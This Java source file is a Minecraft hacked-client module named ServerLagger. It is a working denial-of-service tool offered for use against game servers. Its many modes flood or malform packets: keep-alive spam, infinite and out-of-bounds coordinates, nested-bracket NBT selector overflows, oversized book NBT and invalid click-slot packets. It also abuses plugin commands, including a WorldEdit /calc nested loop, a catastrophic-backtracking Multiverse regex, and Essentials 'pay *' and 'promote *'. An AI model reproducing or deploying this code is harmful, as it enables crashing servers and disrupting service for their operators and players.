package me.flawless.mod.modules.impl.misc;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import me.flawless.api.events.eventbus.EventHandler;
import me.flawless.api.events.impl.PacketEvent;
import me.flawless.api.managers.CommandManager;
import me.flawless.mod.modules.Module;
import me.flawless.mod.modules.settings.impl.BooleanSetting;
import me.flawless.mod.modules.settings.impl.EnumSetting;
import me.flawless.mod.modules.settings.impl.SliderSetting;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.item.ArmorItem;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.common.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.network.packet.s2c.common.KeepAliveS2CPacket;
import net.minecraft.recipe.RecipeEntry;
import net.minecraft.screen.CraftingScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class ServerLagger extends Module {
    private final String message = "\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd";
    private final String color = "red";
    private final Text line1 = Text.Serialization.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
    private final Text line2 = Text.Serialization.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
    private final Text line3 = Text.Serialization.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
    private final Text line4 = Text.Serialization.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
    public ServerLagger() {
        super("ServerLagger", Category.Misc);
    }
    private final EnumSetting<Mode> mode = add(new EnumSetting<>("Mode", Mode.Selector));
    private final SliderSetting offhandPackets = add(new SliderSetting("OPackets", 1000, 1, 10000, 1, v -> mode.getValue() == Mode.OffhandSpam));
    private final SliderSetting vehiclePackets = add(new SliderSetting("VPackets", 2000, 100, 10000, 1, v -> mode.getValue() == Mode.Vehicle || mode.getValue() == Mode.Boat));
    private final SliderSetting creativePackets = add(new SliderSetting("CPackets", 15, 1, 100, 1, v -> mode.getValue() == Mode.CreativePacket));
    private final SliderSetting bookPackets = add(new SliderSetting("BookPackets", 100, 1, 1000, 1, v -> mode.getValue() == Mode.Book || mode.getValue() == Mode.CreativeBook));
    private final SliderSetting aacPackets = add(new SliderSetting("AACPackets", 5000, 1, 10000, 1, v -> mode.getValue() == Mode.AAC || mode.getValue() == Mode.AAC2 || mode.getValue() == Mode.NullPosition));
    private final SliderSetting clickSlotPackets = add(new SliderSetting("SlotPackets", 15, 1, 100, 1, v -> mode.getValue() == Mode.InvalidClickSlot));
    private final SliderSetting interactPackets = add(new SliderSetting("IPackets", 15, 1, 100, 1, v -> mode.getValue() == Mode.InteractNoCom || mode.getValue() == Mode.InteractItem));
    private final SliderSetting movementPackets = add(new SliderSetting("MPackets", 2000, 1, 10000, 1, v -> mode.getValue() == Mode.MovementSpam));
    private final SliderSetting craftPackets = add(new SliderSetting("CraftPackets", 3, 1, 100, 1, v -> mode.getValue() == Mode.Crafting));
    private final SliderSetting sequencePackets = add(new SliderSetting("SPackets", 200, 50, 2000, 1, v -> mode.getValue() == Mode.SequenceBlock || mode.getValue() == Mode.SequenceItem));
    private final SliderSetting commandPackets = add(new SliderSetting("Count", 3, 1, 5, 1, v -> mode.getValue() == Mode.Selector));
    private final SliderSetting length = add(new SliderSetting("Length", 2032, 1000, 3000, 1, v -> mode.getValue() == Mode.Selector));
    private final BooleanSetting autoDisable = add(new BooleanSetting("AutoDisable", true));
    private final BooleanSetting smartDisable = add(new BooleanSetting("SmartDisable", true));
    private final SliderSetting delay = add(new SliderSetting("Delay", 1, 0, 100, 1).setSuffix("tick"));
    int slot = 5;
    private long keepAliveId;
    int ticks = 0;
    @Override
    public void onUpdate() {
        if (nullCheck()) {
            if (autoDisable.getValue()) disable();
            return;
        }
        ticks++;
        if (ticks <= delay.getValue()) {
            return;
        }
        ticks = 0;
        switch (mode.getValue()) {
            case ARMOR -> {
                for (int i = 0; i < 300; i++) {
                    if (mc.player.getInventory().getStack(38).getItem() != Items.AIR) {
                        mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId,
                                6, 0, SlotActionType.SWAP, mc.player);
                    }
                    if (mc.player.getMainHandStack().getItem() instanceof ArmorItem) {
                        mc.interactionManager.interactItem(mc.player, Hand.MAIN_HAND);
                    }
                }
            }
            case CONSOLE -> {
                for (int i = 0; i < 5; i++) {
                    KeepAliveC2SPacket packet = new KeepAliveC2SPacket(keepAliveId++);
                    try {
                        mc.player.networkHandler.sendPacket(packet);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            case OUT_OF_BOUNDS -> {
                for (int i = 0; i < 100; i++) {
                    ItemStack stack = new ItemStack(mc.player.getMainHandStack().getItem());
                    ClickSlotC2SPacket packet = new ClickSlotC2SPacket(0, 69,
                            mc.player.currentScreenHandler.getRevision(), 1,
                            SlotActionType.QUICK_MOVE, stack, new Int2ObjectOpenHashMap<>());
                    try {
                        mc.player.networkHandler.sendPacket(packet);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            case Crafting -> {
                if (!(mc.player.currentScreenHandler instanceof CraftingScreenHandler) || mc.getNetworkHandler() == null) return;
                try {
                    List<RecipeResultCollection> recipeResultCollectionList = mc.player.getRecipeBook().getOrderedResults();
                    for (RecipeResultCollection recipeResultCollection : recipeResultCollectionList) {
                        for (RecipeEntry<?> recipe : recipeResultCollection.getRecipes(true)) {
                            for (int i = 0; i < craftPackets.getValue(); i++) {
                                mc.getNetworkHandler().sendPacket(new CraftRequestC2SPacket(mc.player.currentScreenHandler.syncId, recipe, true));
                            }
                        }
                    }
                } catch (Exception e) {
                    CommandManager.sendChatMessage("§4[!] " + e.getMessage());
                    e.printStackTrace();
                    if (smartDisable.getValue()) disable();
                }
            }
            case SequenceItem -> {
                for (int i = 0; i < sequencePackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, -1));
                }
            }
            case SequenceBlock -> {
                Vec3d pos = new Vec3d(mc.player.getX(), mc.player.getY(), mc.player.getZ());
                BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.ofFloored(pos), false);
                for (int i = 0; i < sequencePackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, -1));
                }
            }
            case MovementSpam -> {
                if (mc.getNetworkHandler() == null) return;
                try {
                    Vec3d current_pos = mc.player.getPos();
                    for (int i = 0; i < movementPackets.getValue(); i++) {
                        PlayerMoveC2SPacket.Full move_packet = new PlayerMoveC2SPacket.Full(current_pos.x + getDistributedRandom(1),
                                current_pos.y + getDistributedRandom(1), current_pos.z + getDistributedRandom(1),
                                (float) rndD(90), (float) rndD(180), true);
                        mc.getNetworkHandler().sendPacket(move_packet);
                    }
                } catch (Exception e) {
                    CommandManager.sendChatMessage("§4[!] " + e.getMessage());
                    e.printStackTrace();
                    if (smartDisable.getValue()) disable();
                }
            }
            case Sign -> mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(mc.player.getBlockPos(), false, line1.getString(), line2.getString(), line3.getString(), line4.getString()));
            case Selector -> {
                String overflow = generateJsonObject(length.getValueInt());

                String partialCommand = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
                for (int i = 0; i < commandPackets.getValue(); i++) {
                    mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                }
                if (smartDisable.getValue()) disable();
            }
            case Lectern -> {
                if (!(mc.currentScreen instanceof LecternScreen)) return;
                mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId, mc.player.currentScreenHandler.getRevision(), 0, 0, SlotActionType.QUICK_MOVE, mc.player.currentScreenHandler.getCursorStack().copy(), Int2ObjectMaps.emptyMap()));
                if (smartDisable.getValue()) disable();
            }
            case InteractNoCom -> {
                for (int i = 0; i < interactPackets.getValue(); i++) {
                    Vec3d cpos = pickRandomPos();
                    mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, BlockPos.ofFloored(cpos), false), 0));
                }
            }
            case InteractOOB -> {
                Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255, Double.NEGATIVE_INFINITY);
                mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored(oob), false), 0));
            }
            case InteractItem -> {
                for (int i = 0; i < interactPackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0));
                }
            }
            case InvalidClickSlot -> {
                Int2ObjectMap<ItemStack> REAL = new Int2ObjectArrayMap<>();
                REAL.put(0, new ItemStack(Items.RED_DYE, 1));
                for (int i = 0; i < clickSlotPackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId,123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), REAL));
                }
            }
            case AAC -> {
                for (double i = 0; i < aacPackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (9412 * i), mc.player.getY() + (9412 * i), mc.player.getZ() + (9412 * i), true));
                }
                if (smartDisable.getValue()) disable();
            }
            case AAC2-> {
                for (double i = 0; i < aacPackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (500000 * i), mc.player.getY() + (500000 * i), mc.player.getZ() + (500000 * i), true));
                }
                if (smartDisable.getValue()) disable();
            }
            case NullPosition -> {
                for (double i = 0; i < aacPackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                }
                if (smartDisable.getValue()) disable();
            }
            case Book, CreativeBook -> {
                for (int i = 0; i < bookPackets.getValue(); i++) sendBadBook();
                if (smartDisable.getValue()) disable();
            }
            case CreativePacket -> {
                if (!mc.player.getAbilities().creativeMode) {
                    if (smartDisable.getValue()) disable();
                    return;
                }

                Vec3d pos = pickRandomPos();
                NbtCompound tag = new NbtCompound();
                NbtList list = new NbtList();
                ItemStack the = new ItemStack(Items.CAMPFIRE);
                list.add(NbtDouble.of(pos.x));
                list.add(NbtDouble.of(pos.y));
                list.add(NbtDouble.of(pos.z));
                tag.put("Pos", list);
                the.setSubNbt("BlockEntityTag", tag);
                for (int i = 0; i < creativePackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(1, the));
                }
            }
            case Boat -> {
                Entity vehicle = mc.player.getVehicle();
                if (vehicle == null) {
                    if (smartDisable.getValue()) disable();
                    return;
                }
                if (!(vehicle instanceof BoatEntity)) {
                    if (smartDisable.getValue()) disable();
                }
                for (int i = 0; i < vehiclePackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new BoatPaddleStateC2SPacket(true, true));
                }
            }
            case Vehicle -> {
                Entity vehicle = mc.player.getVehicle();
                if (vehicle == null) {
                    if (smartDisable.getValue()) disable();
                    return;
                }
                BlockPos start = mc.player.getBlockPos();
                Vec3d end = new Vec3d(start.getX() + .5, start.getY() + 1, start.getZ() + .5);
                vehicle.updatePosition(end.x, end.y - 1, end.z);
                for (int i = 0; i < vehiclePackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new VehicleMoveC2SPacket(vehicle));
                }
            }
            case OffhandSpam -> {
                int index = 0;
                while (index < offhandPackets.getValue()) {
                    mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.UP));
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(true));
                    ++index;
                }
            }
            case WorldEdit -> {
                mc.player.networkHandler.sendCommand("/calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}");
                if (smartDisable.getValue()) disable();
            }
            case Chunk -> {
                double yPos = mc.player.getY();
                while (yPos < 255) {
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), yPos, mc.player.getZ(), true));
                    yPos += 5.0;
                }
                double i = 0;
                while (i < 1337 * 5) {
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + i, 255.0, mc.player.getZ() + i, true));
                    i += 5;
                }
            }
            case MultiverseCore -> {
                mc.player.networkHandler.sendCommand("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
                if (smartDisable.getValue()) disable();
            }
            case Essentials -> {
                mc.player.networkHandler.sendCommand("pay * a a");
                if (smartDisable.getValue()) disable();
            }
            case Promote -> {
                mc.player.networkHandler.sendCommand("promote * a");
                if (smartDisable.getValue()) disable();
            }
        }
    }

    @EventHandler
    public void onPacketInbound(PacketEvent.Receive event) {
        if (mc.player == null || mc.world == null) {
            return;
        }
        if (event.getPacket() instanceof KeepAliveS2CPacket packet) {
            keepAliveId = packet.getId();
        }
    }

    private void sendBadBook() {
        String title = "/stop" + Math.random() * 400;
        String mm255 = RandomStringUtils.randomAlphanumeric(255);

        switch (mode.getValue()) {
            case Book -> {
                ArrayList<String> pages = new ArrayList<>();

                for (int i = 0; i < 50; i++) {
                    pages.add(mm255);
                }

                mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
            }
            case CreativeBook -> {
                for (int i = 0; i < 5; i++) {
                    if (slot > 36 + 9) {
                        slot = 0;
                        return;
                    }
                    slot++;
                    ItemStack book = new ItemStack(Items.WRITTEN_BOOK, 1);
                    NbtCompound tag = new NbtCompound();
                    NbtList list = new NbtList();
                    for (int j = 0; j < 99; j++) {
                        list.add(NbtString.of("{\"text\":" + RandomStringUtils.randomAlphabetic(200) + "\"}"));
                    }
                    tag.put("author", NbtString.of(RandomStringUtils.randomAlphabetic(9000)));
                    tag.put("title", NbtString.of(RandomStringUtils.randomAlphabetic(25564)));
                    tag.put("pages", list);
                    book.setNbt(tag);
                    mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(slot, book));
                }
            }
        }
    }

    public double getDistributedRandom(double rad) {
        return (rndD(rad) - (rad / 2));
    }
    public static double rndD(double rad) {
        Random r = new Random();
        return r.nextDouble() * rad;
    }
    private Vec3d pickRandomPos() {
        return new Vec3d(new Random().nextInt(0xFFFFFF), 255, new Random().nextInt(0xFFFFFF));
    }
    private String generateJsonObject(int levels) {
        String json = IntStream.range(0, levels)
                .mapToObj(i -> "[")
                .collect(Collectors.joining());
        return "{a:" + json + "}";
    }
    @Override
    public String getInfo() {
        return mode.getValue().name();
    }

    @Override
    public void onDisable() {
        ticks = 999;
    }

    @Override
    public void onLogin() {
        if (autoDisable.getValue()) disable();
    }

    @Override
    public void onLogout() {
        if (autoDisable.getValue()) disable();
    }

    public enum Mode {
        ARMOR,
        CONSOLE,
        OUT_OF_BOUNDS,
        Sign,
        Selector,
        Crafting,
        SequenceItem,
        SequenceBlock,
        MovementSpam,
        Lectern,
        InteractNoCom,
        InteractOOB,
        InteractItem,
        InvalidClickSlot,
        AAC,
        AAC2,
        NullPosition,
        Book,
        CreativeBook,
        CreativePacket,
        Boat,
        Vehicle,
        WorldEdit,
        Chunk,
        OffhandSpam,
        MultiverseCore,
        Essentials,
        Promote
    }
}
